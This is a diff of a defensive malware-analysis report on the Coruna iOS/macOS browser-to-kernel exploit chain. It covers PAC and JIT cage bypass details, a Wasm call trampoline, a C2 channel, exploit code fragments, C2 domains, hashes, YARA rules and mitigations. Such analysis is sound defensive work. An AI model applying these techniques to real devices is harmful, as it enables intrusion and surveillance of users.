-The PAC-signed destination pointer (step 1) ensures the copy target cannot be redirected by an attacker - the PACDB signature with context `0x3D96` binds the pointer to the expected JIT page address.
+The PAC-signed destination pointer (step 1) ensures the copy target cannot be redirected by an attacker - the PACDB signature with context `0x47EA` binds the pointer to the expected JIT page address.
 
 #### 8.3.4 Why This Works
 
@@ -5100,13 +5154,13 @@ When thread-fast-exec support is detected, `zg()` provides an optimized path:
 ```javascript
 zg(code) {
     const size = (code.length * 4 + 31) & ~31;   // Round up to 32-byte alignment
-    // Fill buffer with 0x3C (BRK #0 - ARM64 breakpoint)
+    // Fill buffer with 0xCC (INT 3 - x86 software breakpoint)
     // Use lc.Ic() for PAC-authenticated invocation
     return ac.ee(this.sg + CQmh67);              // Return signed pointer
 }
 ```
 
-The breakpoint fill (`0x3C`) ensures that any uninitialized portions of the JIT page will trap rather than execute stale data - a defensive measure borrowed from the legitimate JIT compiler's own page initialization.
+The breakpoint fill (`0xCC`) ensures that any uninitialized portions of the JIT page will trap rather than execute stale data - a defensive measure borrowed from the legitimate JIT compiler's own page initialization.
 
 #### 8.4.2 Code Upload via `Gg()`
 
@@ -5241,7 +5295,7 @@ The Wasm ABI requires 32-bit integer arguments, but the shellcode expects 64-bit
 2. `rg()` splits each 64-bit value into two 32-bit halves (low, high)
 3. The Wasm function `f` receives 16 `i32` parameters
 4. The Wasm module's code section packs adjacent `i32` pairs back into `i64` values using `i64.extend_i32_u` and shift/or operations
-5. These `i64` values map to ARM64 registers `x0`–`x7` when the JIT-compiled Wasm code executes
+5. These `i64` values map to ARM64 registers `x0`-`x7` when the JIT-compiled Wasm code executes
 
 The return path reverses this: the native function's 64-bit return value (in `x0`) is written to Wasm memory export `m` as two `Uint32` words, then reconstructed into a `K.Vt` (64-bit pointer pair) by JavaScript.
 
@@ -5252,13 +5306,23 @@ With all components constructed - symbol resolution (`Lg`), code signing (`Ig`),
 #### 8.6.1 Module Initialization (`r.Sg()`)
 
 ```javascript
+// Payload B inner:
 r.Sg = function() {
-    const hc_instance = new hc();       // Instantiate helper class
-    M.Fn = T.Dn.Fn;                     // Copy platform flags to local module state
+    M.Fn = oc.ag();                     // oc.ag() returns new hc() - stores hc instance
+};
+
+// Payload A inner:
+r.Sg = function() {
+    const i = new ni();                 // Native interface class
+    i.iI(size);                         // Allocate executable page
+    i.cI(code);                         // Upload ARM64 shellcode to the page
+    i.tI(target, code);                 // Register target function pointer and code
+    T.Dn.Fn = new oi(i);               // Wrap ni in oi and store
+    T.Dn.Gn = i;                       // Also store raw ni reference
 };
 ```
 
-The `Sg()` method is deliberately minimal. Its role is to instantiate the local helper class `hc` and propagate the platform configuration flags (`T.Dn.Fn`) that were established during the stage-2 fingerprinting phase. These flags encode capabilities such as PAC availability, arm64e detection, and JIT signing mode - all of which the `rg()` dispatcher inspects at call time.
+The two payload variants diverge here. Payload B's `Sg()` is minimal - it calls the static factory `oc.ag()` (which returns `new hc()`) and stores the resulting class instance in `M.Fn`. Payload A's `Sg()` is far more substantial: it creates an `ni` (native interface) instance, allocates an executable page via `iI()`, uploads shellcode via `cI()`, registers the target via `tI()`, then wraps the result in an `oi` instance stored in `T.Dn.Fn`. In both cases, `M.Fn`/`T.Dn.Fn` holds a **class instance** (hc or oi), not platform flags.
 
 In the inner payload modules (`final_payload_A_16434916_inner.js` and `final_payload_B_6241388a_inner.js`), the initialization is more substantial:
 
@@ -5364,7 +5428,7 @@ Each final payload file follows a three-layer nesting structure:
 │  │  │   ├── class YA       - payload builder / layout engine     │
 │  │  │   └── r.lA           - top-level entry point               │
 │  │  │                                                            │
-│  │  ├── Base64 Block #0: Inner JS Module (28–47KB)              │
+│  │  ├── Base64 Block #0: Inner JS Module (28-47KB)              │
 │  │  │   └── Classes ni, Ii, oi - JIT cage escape impl.          │
 │  │  │                                                            │
 │  │  ├── Base64 Block #1: Binary Blob #1 (~31KB)                 │
@@ -5386,8 +5450,8 @@ The two binary blobs (Blocks #1 and #2) are passed to the `YA` payload builder, 
 |----------|-----------|-----------|
 | Outer file size | 136,608 bytes | 161,529 bytes |
 | Inner module size | 28,377 bytes | 47,076 bytes |
-| Binary blob #1 | 41,746 b64 chars (~31KB) | 41,746 b64 chars (~31KB) |
-| Binary blob #2 | 39,882 b64 chars (~30KB) | 39,882 b64 chars (~30KB) |
+| Binary blob #1 | 41,744 b64 chars (~31KB) | 41,744 b64 chars (~31KB) |
+| Binary blob #2 | 39,880 b64 chars (~30KB) | 39,880 b64 chars (~30KB) |
 | Module hash | `356d2282845eafd8...` | Different hash |
 | Wrapper JS structure | Identical architecture | Identical architecture |
 
@@ -5395,7 +5459,7 @@ The binary blobs are **identical** between variants - both carry the same ARM64 
 
 ### 9.2 The C2 State Machine (`xA()`)
 
-The `xA()` function creates a polling-based command-and-control interface using a `SharedArrayBuffer`-backed state machine. Rather than maintaining a persistent WebSocket connection (which would be visible to network monitoring tools), the state machine operates through discrete HTTP transactions coordinated via shared memory.
+The `xA()` function creates a polling-based command-and-control interface using an `ArrayBuffer`-backed state machine. Rather than maintaining a persistent WebSocket connection (which would be visible to network monitoring tools), the state machine operates through discrete HTTP transactions coordinated via shared memory.
 
 #### 9.2.1 State Constants
 
@@ -5749,7 +5813,7 @@ The execution flow is:
 
 ```
 yA()
- ├─ xA()           → Create 16MB SharedArrayBuffer + state machine
+ ├─ xA()           → Create 16MB ArrayBuffer + state machine
  ├─ new YA(...)     → Construct payload builder with shellcode + fingerprint
  ├─ gg(size)        → Allocate RWX JIT page via kernel trap
  ├─ SA(base)        → Serialize payload to binary layout
@@ -5809,11 +5873,17 @@ The final payload module is the operational core of the Coruna exploit chain. It
 
 - **Version-aware gadget selection**: The exploit maintains a lookup table mapping iOS/macOS version ranges (16.0 through 17.1+) to specific framework binaries and instruction patterns. This supports five version tiers with automatic fallback, covering the full range of deployment targets.
 
-- **Bidirectional C2 via SharedArrayBuffer**: The native implant communicates with JavaScript through a shared 16MB memory region. JavaScript handles network I/O (downloads, uploads, script injection), while the shellcode controls the operations via state word manipulation. This avoids the implant needing to make any direct network calls, which would require additional sandbox escape capabilities.
+- **Bidirectional C2 via ArrayBuffer**: The native implant communicates with JavaScript through a 16MB memory region. JavaScript handles network I/O (downloads, uploads, script injection), while the shellcode controls the operations via state word manipulation. This avoids the implant needing to make any direct network calls, which would require additional sandbox escape capabilities.
 
 - **Victim fingerprinting**: `document.URL` and `navigator.userAgent` are embedded directly in the payload and exfiltrated to the C2. This provides the operator with precise identification of the compromised device, browser version, and the specific watering-hole page that triggered the exploit.
 
 - **Anti-forensics**: The cleanup routine (`kA()`) injects dummy DOM elements and manipulates browser history entries, then removes them after a delay. The global `window.qbrdr` callback provides a clean interface for downloaded scripts to signal back without exposing internal state.
+
+### 9.7 Connection to Kernel Exploitation Stage
+
+The C2 state machine's DOWNLOAD command is the delivery mechanism for the kernel exploit. Once the shellcode is running and the ArrayBuffer C2 channel is active, the server sends a DOWNLOAD instruction containing the URL for `dump.bin` - a 2MB ARM64 DYLIB kernel exploit targeting CVE-2023-41974 (IOSurfaceRoot use-after-free). The binary is fetched via the same JavaScript-mediated HTTP path used for all C2 traffic, then injected into the `powerd` system daemon for execution. This means the kernel exploit never touches disk - it is downloaded into the browser process's memory via the ArrayBuffer channel, then loaded into `powerd` via process injection.
+
+The full static analysis of `dump.bin` is documented in Section 14.
 
 ---
 
@@ -5894,10 +5964,12 @@ The largest and most complex module - this is the trampoline that enables arbitr
   (table (export "t") 1 funcref)                ;; Function table for indirect call
   (memory (export "m") 1)                       ;; 1 page (64KB) for return values
 
-  (func (export "o") (result i64)               ;; Get internal function pointer
+  (func (export "o") (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)
+    ;; Type $t0: takes 8 i64 params (all ignored), returns i64
     i64.const 0)                                ;; Placeholder - actual value read externally
 
   (func $call_inner (param 16 × i32) (result i64)
+    ;; Type $t1: (16×i32) → i64
     ;; Pack 16 i32 params into 8 i64 values:
     ;; i64 = (param[2n+1] << 32) | param[2n]
     local.get 1  i64.extend_i32_u  i64.const 32  i64.shl
@@ -5905,14 +5977,13 @@ The largest and most complex module - this is the trampoline that enables arbitr
     ;; ... repeat for x1-x7 ...
     call_indirect (type $t0) 0)                  ;; Indirect call via table[0]
 
-  (func $call_passthrough (param 16 × i32)
-    ;; Forward all 16 params to $call_inner
+  (func $call_passthrough (param 16 × i32) (result i64)
+    ;; Type $t1: (16×i32) → i64 - forwards return value from $call_inner
     local.get 0 ... local.get 15
-    call $call_inner
-    drop)                                        ;; Discard return value
+    call $call_inner)                            ;; Return value forwarded (not dropped)
 
-  (func (export "f") (param 16 × i32) (result i64)
-    ;; Call $call_passthrough, capture return in local
+  (func (export "f") (param 16 × i32)            ;; Type $t2: (16×i32) → void
+    ;; Call $call_passthrough, store return to memory
     local.get 0 ... local.get 15
     call $call_passthrough
     ;; Read return value and store to memory
@@ -5931,7 +6002,7 @@ The largest and most complex module - this is the trampoline that enables arbitr
 The trampoline works by:
 
 1. **Export `f`** accepts 16 `i32` arguments (representing 8 register pairs)
-2. **Internally**, `$call_inner` packs adjacent `i32` pairs into `i64` values via bit extension and shift/or, mapping to ARM64 registers `x0`–`x7`
+2. **Internally**, `$call_inner` packs adjacent `i32` pairs into `i64` values via bit extension and shift/or, mapping to ARM64 registers `x0`-`x7`
 3. **`call_indirect`** dispatches through the function table - the exploit overwrites the table's internal JIT code pointer with the target address
 4. **Return values** are split back into two `i32` words and stored in linear memory at offset 0, where JavaScript reads them via `new Uint32Array(instance.exports.m.buffer)`
 
@@ -5947,7 +6018,7 @@ All strings in the Coruna framework are XOR-encoded at rest using the pattern:
 [n1, n2, ..., nN].map(x => { return String.fromCharCode(x ^ KEY); }).join("")
 ```
 
-Each module uses a different XOR key (range 45–122), and the same logical string may appear with different keys across different files. Automated extraction recovered **167 unique decoded strings** from all 28 JavaScript files. They are organized below by functional category.
+Each module uses a different XOR key (range 45-122), and the same logical string may appear with different keys across different files. Automated extraction recovered **167 unique decoded strings** from all 28 JavaScript files. They are organized below by functional category.
 
 ### 11.1 Module Hash Identifiers (5 strings)
 
@@ -5955,9 +6026,9 @@ These SHA-1 hashes serve as module identity tokens within the `vKTo89` namespace
 
 | Decoded String | XOR Keys Used | Files |
 |---|---|---|
-| `1ff010bb3e857e2b0383f1d9a1cf9f54e321fbb0` | 23 distinct keys (45–119) | 28 |
-| `6b57ca3347345883898400ea4318af3b9aa1dc5c` | 61 distinct keys (45–122) | 28 |
-| `81502427ce4522c788a753600b04c8c9e13ac82c` | 7 keys (48–113) | 8 |
+| `1ff010bb3e857e2b0383f1d9a1cf9f54e321fbb0` | 23 distinct keys (45-119) | 28 |
+| `6b57ca3347345883898400ea4318af3b9aa1dc5c` | 61 distinct keys (45-122) | 28 |
+| `81502427ce4522c788a753600b04c8c9e13ac82c` | 7 keys (48-113) | 8 |
 | `356d2282845eafd8cf1ee2fbb2025044678d0108` | 2 keys (74, 95) | 2 |
 | `7861d5490d7bf5ab22539b5e32f86fd77d53d85b` | 2 keys (68, 80) | 2 |
 
@@ -5970,7 +6041,7 @@ Used by the Mach-O parser (Section 3) and gadget scanner (Section 6) to locate s
 | Decoded String | XOR Keys | Files | Purpose |
 |---|---|---|---|
 | `__TEXT` | 24 keys | 16 | Primary executable code segment |
-| `__text` | 4 keys (55–86) | 4 | Code section within `__TEXT` |
+| `__text` | 4 keys (55-86) | 4 | Code section within `__TEXT` |
 | `__AUTH` | 7 keys | 8 | PAC-authenticated data segment |
 | `__AUTH_CONST` | 14 keys | 10 | Authenticated read-only data (GOT entries) |
 | `__DATA` | 7 keys | 6 | Read-write data segment |
@@ -5987,7 +6058,7 @@ Used by the Mach-O parser (Section 3) and gadget scanner (Section 6) to locate s
 
 The segment/section names reflect deep knowledge of Apple's internal memory layout. `__AUTH_CONST` is particularly significant - it contains PAC-protected GOT entries that the exploit temporarily overwrites during the GOT-swap bypass (Section 7).
 
-### 11.3 Framework & Library Paths (28 strings)
+### 11.3 Framework & Library Paths (27 strings)
 
 Dynamic library paths resolved through the dyld shared cache walker. These identify the specific binaries the exploit parses to find gadgets.
 
@@ -6082,7 +6153,7 @@ Low-level identifiers used for dyld shared cache parsing and JIT cage manipulati
 
 | Decoded String | XOR Keys | Files | Purpose |
 |---|---|---|---|
-| `libdyld.dylib` | 7 keys (50–120) | 8 | Short name for dynamic linker library lookup |
+| `libdyld.dylib` | 7 keys (50-120) | 8 | Short name for dynamic linker library lookup |
 | `dyld_v1  arm64e` | 1 key (88) | 2 | Magic bytes identifying `arm64e` dyld shared cache |
 | `dyld` | 1 key (89) | 2 | Dyld identifier for cache header validation |
 | `_dyld_initializer` | 1 key (49) | 2 | Dyld initialization symbol |
@@ -6116,8 +6187,8 @@ These strings support the NaN-boxing type confusion engine (Section 4), JIT comp
 
 | Decoded String | XOR Keys | Files | Purpose |
 |---|---|---|---|
-| `bigint` | 8 keys (48–112) | 4 | `typeof` check - BigInt type discrimination |
-| `number` | 5 keys (48–85) | 8 | `typeof` check - Number type discrimination |
+| `bigint` | 8 keys (48-112) | 4 | `typeof` check - BigInt type discrimination |
+| `number` | 5 keys (48-85) | 8 | `typeof` check - Number type discrimination |
 | `0xFFFFFFFF` | 4 keys (55, 88, 101, 115) | 2 | 32-bit mask for pointer truncation |
 | `0x7FFFFFFFFF` | 1 key (54) | 2 | 39-bit mask - tagged pointer extraction on arm64e |
 | `0xfffe000000055432` | 1 key (56) | 2 | NaN-boxed test value - probes JSC's type encoding |
@@ -6151,9 +6222,9 @@ These array literals are not arbitrary - each one probes a specific JSC storage 
 | Decoded String | XOR Keys | Files | Purpose |
 |---|---|---|---|
 | `sentence` | 3 keys (55, 77, 80) | 6 | `Intl.Segmenter` granularity option - triggers ICU code path |
-| `en-US` | 6 keys (52–114) | 2 | Locale for `Intl.Segmenter` construction |
+| `en-US` | 6 keys (52-114) | 2 | Locale for `Intl.Segmenter` construction |
 | `func` | 1 key (86) | 2 | Wasm function type keyword |
-| `arg0` – `arg4` | 5 keys (99–113) | 2 | Wasm function argument names for dynamic construction |
+| `arg0` - `arg4` | 5 keys (99-113) | 2 | Wasm function argument names for dynamic construction |
 | `btl` | 1 key (78) | 2 | Wasm export name - "buffer table length" accessor |
 | `alt` | 1 key (72) | 2 | Wasm export name - "allocate" function |
 
@@ -6182,7 +6253,7 @@ Function symbols used as GOT-swap targets, indirect call gadgets, or memory prim
 | `pthread_main_thread_np` | 1 key (101) | 2 | Thread identity check |
 | `mprotect` | 1 key (121) | 2 | Memory protection syscall |
 | `'anonymous namespace'::begin(__int64)` | 1 key (68) | 2 | Demangled C++ symbol - iterator gadget |
-| `libxml2.2.dylib` | 6 keys (49–121) | 6 | Library short name for cache image lookup |
+| `libxml2.2.dylib` | 6 keys (49-121) | 6 | Library short name for cache image lookup |
 | `libxslt` | 1 key (56) | 2 | XSLT library identifier |
 | `libSystem.B.dylib` | 2 keys (74, 122) | 4 | System library - contains `dlsym`, `mprotect` |
 
@@ -6207,8 +6278,8 @@ Namespace identifiers, configuration keys, internal module names, and operationa
 
 | Decoded String | XOR Keys | Files | Purpose |
 |---|---|---|---|
-| `vKTo89` | 4 keys (88–116) | 2 | Primary module namespace - all modules register under this |
-| `OLdwIx` | 4 keys (53–117) | 2 | Secondary namespace / obfuscation layer identifier |
+| `vKTo89` | 4 keys (88-116) | 2 | Primary module namespace - all modules register under this |
+| `OLdwIx` | 4 keys (53-117) | 2 | Secondary namespace / obfuscation layer identifier |
 | `Navigator` | 2 keys (95, 99) | 2 | `window.Navigator` - platform detection |
 | `g_config` | 1 key (57) | 2 | Global configuration object name |
 | `CallbackObject` | 1 key (75) | 2 | Internal class name for callback wrappers |
@@ -6246,20 +6317,20 @@ The `HeaderSeed`, `EncryptedBlocks`, and `HeaderKey` strings reveal that the fin
 |---|---|---|
 | Module Hash Identifiers | 5 | Module registration & dependency resolution |
 | Mach-O Segments & Sections | 15 | Binary parsing & memory region identification |
-| Framework & Library Paths | 28 | Dyld cache image resolution |
+| Framework & Library Paths | 27 | Dyld cache image resolution |
 | C++ Symbol Names | 9 | Runtime symbol lookup via `dlsym` / export trie |
 | Network & Protocol | 6 | C2 communication |
 | DOM & Browser | 8 | Script injection & UI concealment |
 | Dyld & JIT System | 6 | Cache validation & JIT cage targeting |
 | XML/XSLT Triggers | 8 | PAC bypass trigger mechanism |
-| Exploit Primitives | 25 | Type confusion, JIT forcing, Wasm setup |
+| Exploit Primitives | 26 | Type confusion, JIT forcing, Wasm setup |
 | Gadget Functions & Libraries | 20 | GOT-swap targets & indirect call gadgets |
 | Framework Path Fragments | 8 | Fallback image resolution |
 | Internal Identifiers | 17 | Configuration, namespaces, encryption keys |
 | Miscellaneous | 8 | URL patterns, test strings, formatting |
 | **Total** | **167** | |
 
-Every string in the framework is XOR-encoded with a per-module key, ensuring that no plaintext indicators survive static analysis. The diversity of XOR keys (45–122) across modules means signature-based detection must account for 60+ distinct encoding variants of the same logical string.
+Every string in the framework is XOR-encoded with a per-module key, ensuring that no plaintext indicators survive static analysis. The diversity of XOR keys (45-122) across modules means signature-based detection must account for 60+ distinct encoding variants of the same logical string.
 
 ---
 
@@ -6271,7 +6342,12 @@ Every string in the framework is XOR-encoded with a per-module key, ensuring tha
 
 | Indicator | Type | Context |
 |---|---|---|
-| `b27.icu` | Domain | Sole command-and-control domain; serves all exploit modules and receives exfiltrated data |
+| `b27.icu` | Domain | Primary C2 domain (analyzed instance); serves all exploit modules and receives exfiltrated data |
+| `h4k.icu` | Domain | Additional delivery domain (GTIG) |
+| `7p.game` | Domain | Additional delivery domain (GTIG) |
+| `spin7.icu` | Domain | Additional delivery domain (GTIG) |
+| `k96.icu` | Domain | Additional delivery domain (GTIG) |
+| `seven7.vip` | Domain | Additional delivery domain (GTIG) |
 
 **C2 URL Patterns:**
 
@@ -6339,12 +6415,27 @@ All observed delivery URLs follow the pattern `https://b27.icu/<sha1_hash>.js` w
 |---|---|---|---|
 | `fc47f65e...` | 165 bytes | R/W adapter (large) | `b903...6c28.js`, `KRfmo6` |
 | `4897b6fb...` | 92 bytes | R/W adapter (small) | `7994...3736.js`, `yAerzw` |
-| `e083ec33...` | 117 bytes | NaN-boxing bridge | `8d64...5812.js`, `Fq2t1Q` |
-| `fddb2df5...` | 306 bytes | Call trampoline | `9e7e...ea72.js`, `YGPUu7` |
+| `e083ec33...` | 117 bytes | NaN-boxing bridge | `9e7e...ea72.js`, `YGPUu7` |
+| `fddb2df5...` | 306 bytes | Call trampoline | `d9a260b1...4da0.js`, `eOWEVG` |
+
+**Kernel Exploit Binary (Stage 2):**
+
+| Hash | Algorithm | Value |
+|---|---|---|
+| SHA-256 | `3b52e3b489948ae491a44faf24a9634e4c959408b321b9c36c367324874a05dc` | dump.bin |
+| SHA-1 | `fee91ff66deebea8708e6453f527833c95b67cd4` | dump.bin |
+| MD5 | `ae3885437016750cb6b9367402fa3ac6` | dump.bin |
+
+| Property | Value |
+|---|---|
+| Format | Mach-O 64-bit ARM64 DYLIB |
+| Size | 2,097,152 bytes (2.00 MB) |
+| CVE | CVE-2023-41974 (IOSurfaceRoot use-after-free) |
+| Source | Runtime memory dump from `powerd` daemon (matteyeux) |
 
 ### 12.3 YARA Detection Rules
 
-The following YARA rules target structural and behavioral patterns unique to the Coruna framework. They are designed for both on-disk scanning and in-memory/network stream inspection.
+The following YARA rules target structural and behavioral patterns unique to the Coruna framework. Rules 1-2 detect on-disk Coruna JS modules directly. Rules 3-7 target **decoded content** (post-XOR strings, extracted Wasm binaries, or network captures) - they will not match the obfuscated on-disk JS files, where all sensitive strings are XOR-encoded.
 
 ```yara
 rule Coruna_XOR_Encoding_Pattern
@@ -6430,7 +6521,7 @@ rule Coruna_Final_Payload_Structure
         $hdr_seed = "HeaderSeed" ascii
         $hdr_key = "HeaderKey" ascii
         $enc_blocks = "EncryptedBlocks" ascii
-        $shared_buf = "SharedArrayBuffer" ascii
+        $shared_buf = "ArrayBuffer" ascii
         $xor_map = /.map\(x\s*=>\s*\{return String\.fromCharCode/ ascii
 
     condition:
@@ -6475,15 +6566,15 @@ rule Coruna_Wasm_RW_Adapter
 
 **Rule coverage summary:**
 
-| Rule | Targets | False Positive Risk |
-|---|---|---|
-| `Coruna_XOR_Encoding_Pattern` | All 28 JS files - structural XOR `.map()` pattern | Low - requires 5+ instances in <500KB file |
-| `Coruna_Module_Namespace` | Module registration system | Very low - `vKTo89` is unique |
-| `Coruna_PAC_Bypass_Strings` | Post-decoding / memory scan | Low - combination of arm64e-specific symbols |
-| `Coruna_GOT_Swap_Gadgets` | Gadget scanner modules | Medium - individual names exist in Apple code |
-| `Coruna_Final_Payload_Structure` | Final payloads A/B | Very low - encryption marker combination |
-| `Coruna_C2_URL_Pattern` | Network capture / loader modules | Low - domain is primary indicator |
-| `Coruna_Wasm_RW_Adapter` | Wasm-containing modules | Low - `btl`/`alt` exports are custom |
+| Rule | Scan Context | Targets | False Positive Risk |
+|---|---|---|---|
+| `Coruna_XOR_Encoding_Pattern` | **On-disk JS** | All 28 JS files - structural XOR `.map()` pattern | Low - requires 5+ instances in <500KB file |
+| `Coruna_Module_Namespace` | **On-disk JS** | Module registration system | Very low - `vKTo89` is unique |
+| `Coruna_PAC_Bypass_Strings` | **Post-decode / memory** | Decoded string buffers in process memory | Low - combination of arm64e-specific symbols |
+| `Coruna_GOT_Swap_Gadgets` | **Post-decode / memory** | Decoded gadget name strings | Medium - individual names exist in Apple code |
+| `Coruna_Final_Payload_Structure` | **Post-decode / memory** | Decoded final payload objects | Very low - encryption marker combination |
+| `Coruna_C2_URL_Pattern` | **Network / IOC** | Network captures, DNS logs, plaintext configs | Low - domain is primary indicator |
+| `Coruna_Wasm_RW_Adapter` | **Extracted Wasm** | Extracted .wasm binaries (not JS wrappers) | Low - `btl`/`alt` exports are custom |
 
 ### 12.4 Network Detection Rules (Suricata)
 
@@ -6522,7 +6613,7 @@ The following runtime behaviors, observable through endpoint telemetry (EDR, sys
 |---|---|---|
 | Safari/WebContent process calling `mach_vm_allocate` with RWX permissions | Syscall monitoring / `dtrace` | JIT cage escape - allocating executable memory outside JIT region |
 | `dlsym()` calls resolving `jitCagePtr`, `SecureARM64EHashPins` | Library call tracing | Exploit resolving JIT cage internals at runtime |
-| Abnormally large `SharedArrayBuffer` allocation (16 MB) | Memory profiling | C2 state machine communication channel |
+| Abnormally large `ArrayBuffer` allocation (16 MB) | Memory profiling | C2 state machine communication channel |
 | `XSLTProcessor.transformToFragment()` called immediately after page load | WebKit instrumentation | PAC bypass trigger - unusual for legitimate web content |
 | `Intl.Segmenter` instantiation with `sentence` granularity followed by rapid iteration | JS profiling | Alternative PAC bypass trigger |
 | Multiple `eval()` calls processing XOR-decoded strings | JS engine telemetry | Runtime deobfuscation of exploit modules |
@@ -6531,7 +6622,7 @@ The following runtime behaviors, observable through endpoint telemetry (EDR, sys
 
 | Artifact | Location | Indicator Of |
 |---|---|---|
-| 16 MB `SharedArrayBuffer` with structured state fields at fixed offsets | WebContent process heap | C2 state machine active |
+| 16 MB `ArrayBuffer` with structured state fields at fixed offsets | WebContent process heap | C2 state machine active |
 | Modified `__AUTH_CONST` segment GOT entries | dyld shared cache mapping | GOT-swap PAC bypass in progress |
 | Wasm instance with `call_indirect` table containing non-Wasm code pointers | JIT region | Trampoline hijack - native code execution via Wasm dispatch |
 | ARM64 shellcode in `mach_vm_allocate`'d RWX pages outside JIT cage | Process memory | Post-exploitation payload staged |
@@ -6559,7 +6650,7 @@ The following runtime behaviors, observable through endpoint telemetry (EDR, sys
 
 5. **Enable Lockdown Mode** on high-value iOS/macOS devices (executives, administrators, journalists). Lockdown Mode disables JIT compilation in Safari, eliminating the JIT cage escape vector entirely.
 6. **Monitor for `.icu` TLD DNS queries** - this TLD has an outsized representation in malicious infrastructure relative to legitimate use.
-7. **Audit `SharedArrayBuffer` usage** - this API requires `Cross-Origin-Isolation` headers; unexpected presence indicates either misconfiguration or exploitation.
+7. **Audit large `ArrayBuffer` allocations** (e.g., 16 MB) from browser content processes - legitimate web content rarely requires buffers of this size.
 8. **Deploy WebKit crash report analysis** - failed exploitation attempts generate characteristic crash signatures in `__AUTH_CONST` region access violations.
 
 **Long-Term (Strategic):**
@@ -6569,25 +6660,462 @@ The following runtime behaviors, observable through endpoint telemetry (EDR, sys
 11. **Endpoint detection engineering** - build detections for `mach_vm_allocate` RWX allocations from browser processes, which have no legitimate use case.
 12. **Threat hunt retrospectively** - search proxy logs for the C2 URL patterns (Section 12.1), particularly the `.min.js.js` double extension and `?e=` query parameter, to identify historical compromise.
 
+**Kernel & Post-Exploitation Indicators:**
+
+13. **Update to iOS 17.0+** - CVE-2023-41974 was patched in iOS 17.0 / macOS Sonoma (September 2023). Devices running iOS 16.x or earlier remain vulnerable to the kernel exploitation stage.
+14. **Block additional delivery domains** - `h4k.icu`, `7p.game`, `spin7.icu`, `k96.icu`, `seven7.vip` (documented by GTIG).
+15. **Monitor for PlasmaLoader DGA** - The post-exploitation implant generates 15-character `.xyz` domains seeded with the string `"lazarus"` as a C2 fallback. DNS queries for algorithmically-generated `.xyz` domains from iOS devices are highly anomalous.
+16. **Detect `powerd` anomalies** - The kernel exploit is injected into the `powerd` system daemon. Unexpected DYLIBs loaded into `powerd`, or `powerd` making network connections, are indicators of compromise.
+
+---
+
+## 14. Kernel Exploitation Stage (`dump.bin`)
+
+This section documents the static analysis of the kernel exploit binary (`dump.bin`) - the next stage after Coruna's browser exploit chain achieves native code execution and downloads the payload via the C2 `DOWNLOAD` command (Section 9.7). The binary was recovered from a live iPhone X by security researcher matteyeux and is publicly available in the `apple_submissions/kernel_exploit/` directory. All analysis is based on the error-corrected findings in the standalone kernel report (`KERNEL_EXPLOIT_ANALYSIS.md`).
+
+### 14.1 Mach-O Binary Structure
+
+The kernel exploit is a **64-bit ARM64 dynamic library** (2.00 MB), designed for injection into a running process via `dlopen` or direct memory mapping.
+
+**Header:**
+
+```
+Magic:          0xFEEDFACF (MH_MAGIC_64)
+CPU Type:       ARM64
+File Type:      DYLIB (6)
+Load Commands:  21 (1,936 bytes)
+Flags:          MH_NOUNDEFS | MH_DYLDLINK | MH_TWOLEVEL
+File Size:      2,097,152 bytes (2.00 MB)
+```
+
+**Build Environment:**
+
+| Field | Value |
+|---|---|
+| Platform | iOS |
+| Minimum OS | 14.0.0 |
+| SDK | 14.0.0 |
+| Linker | LD 820.1.0 |
+| UUID | `018f0aea-e228-3440-ba05-14d21d036ce1` |
+
+The minimum deployment target of **iOS 14.0** despite deployment against iOS 16.6 indicates the exploit was maintained across multiple iOS generations.
+
+> **SoC Discrepancy**: The dump source is an iPhone X (A11 / T8015), yet the binary's C-strings only contain offset identifiers for `T8020` (A12) and `T8120` (A16) - not T8015. The exploit was running successfully on a device whose SoC is absent from its own identifier strings, implying either a fallback code path, `__const` data section encoding, or hardcoded A11-specific offsets.
+
+**Linked Libraries:**
+
+| Library | Purpose |
+|---|---|
+| `libc++.1.dylib` | C++ standard library |
+| `Foundation.framework` | ObjC foundation classes |
+| `CoreFoundation.framework` | CF types for IOKit serialization |
+| `IOKit.framework` | **Primary attack surface** - driver interaction |
+| `libSystem.B.dylib` | System calls, threading, memory |
+
+The IOKit + CoreFoundation + libSystem combination is the classic fingerprint of an iOS kernel exploit.
+
+### 14.2 Memory Layout
+
+```
+Address Range                    Segment          Size      Prot   Contents
+──────────────────────────────── ──────────────── ───────── ────── ─────────────────────
+0x000000 - 0x044000              __TEXT           278,528   r-x    Code + read-only data
+0x044000 - 0x048000              __DATA_CONST      16,384   rw-    GOT, constants, CFStrings
+0x048000 - 0x04C000              __DATA            16,384   rw-    BSS (zero-initialized globals)
+0x04C000 - 0x058000              __LINKEDIT        49,152   r--    Symbol tables, string tables
+```
+
+**Total mapped size: 352 KB** - compact for a kernel exploit of this sophistication.
+
+**Key sections:**
+
+| Segment | Section | Size | Purpose |
+|---|---|---|---|
+| `__TEXT` | `__text` | 237,176 B | Executable code - 587 of 649 functions |
+| `__TEXT` | `__stubs` | 2,928 B | 244 lazy symbol stubs (244 × 12 bytes) |
+| `__TEXT` | `__cstring` | 3,460 B | 153 C string literals |
+| `__TEXT` | `__const` | 2,892 B | Read-only constants |
+| `__DATA_CONST` | `__got` | 2,112 B | 264 GOT entries (resolved at runtime) |
+| `__DATA` | `__common` | 256 B | Uninitialized global variables |
+
+Because this binary was dumped from a running process, the LINKEDIT segment has a **+0x4000 slide** between its file offset and virtual address. All symbol/string table offsets in the raw dump required adjustment.
+
+**Notable structural observations:**
+- `__DATA` segment has filesize=0 (BSS zero-initialized at load) - runtime global state is lost in the dump
+- No `__stub_helper` section despite 244 stubs - all symbols eagerly resolved via GOT before dump
+- 4 CFString objects contain live runtime ISA pointers (`0x1EE30AF00`), confirming memory dump origin
+- `__objc_imageinfo` flags = 0x40 (`IS_SIMULATED`) - unusual for a real device; possibly deliberate obfuscation
+
+### 14.3 Symbol Analysis
+
+The binary exports a single function and imports 265 symbols from system frameworks.
+
+**Sole Export:**
+
+```
+_driver    offset: 0x7514    size: 29,972 bytes    [EXTERNAL]
+```
+
+`_driver` is the kernel exploit's entry point - a 29,972-byte monolithic function containing the core exploit logic. Its size (the largest of 649 functions by ~2.6×) marks it as the orchestrator for IOSurface interaction, kernel memory corruption, and post-exploitation.
+
+**Import Categories (265 total):**
+
+| Subsystem | Count | Purpose in Exploit |
+|---|---|---|
+| **Mach/VM** | 82 | Kernel memory read/write/remap, Mach ports, threading |
+| **CoreFoundation** | 41 | Dictionary/data/string manipulation for IOKit serialization |
+| **IOKit/Kernel** | 30 | Driver interaction - IOSurface, IOConnect, IORegistry |
+| **FileSystem** | 30 | Mount/unmount, file I/O, dlopen/dlsym |
